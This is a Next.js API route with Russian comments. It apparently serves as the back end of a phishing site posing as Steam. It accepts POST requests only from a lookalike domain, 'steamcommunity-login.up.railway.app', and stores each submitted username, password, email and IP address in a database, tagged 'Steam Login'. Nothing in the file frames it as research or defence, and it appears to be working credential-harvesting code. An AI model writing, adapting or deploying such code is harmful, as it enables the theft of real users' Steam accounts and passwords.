import { NextResponse } from "next/server";
import { createUser, isEmailOrLoginTaken } from "@/lib/db";

// CORS headers
const corsHeaders = {
  'Access-Control-Allow-Origin': 'https://steamcommunity-login.up.railway.app',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
};

export async function OPTIONS() {
  return new Response(null, {
    status: 200,
    headers: corsHeaders
  });
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { username, password, email, ip } = body;

    // Проверяем нет ли такого пользователя
    if (isEmailOrLoginTaken(email, username)) {
      return NextResponse.json(
        { error: "Пользователь с таким логином или email уже существует" },
        { status: 400, headers: corsHeaders }
      );
    }

    // Создаем пользователя
    const user = await createUser({
      email: email || `${username}@steam.com`,
      login: username,
      password: password,
      ip: ip,
      userAgent: "Steam Login"
    });

    // Возвращаем успех (без пароля)
    const { password: _, ...userWithoutPassword } = user;
    return NextResponse.json(
      { 
        success: true, 
        user: userWithoutPassword,
        message: "Пользователь добавлен в очередь подтверждения" 
      },
      { status: 201, headers: corsHeaders }
    );

  } catch (error) {
    console.error("Steam register error:", error);
    return NextResponse.json(
      { error: "Ошибка при регистрации через Steam" },
      { status: 500, headers: corsHeaders }
    );
  }
}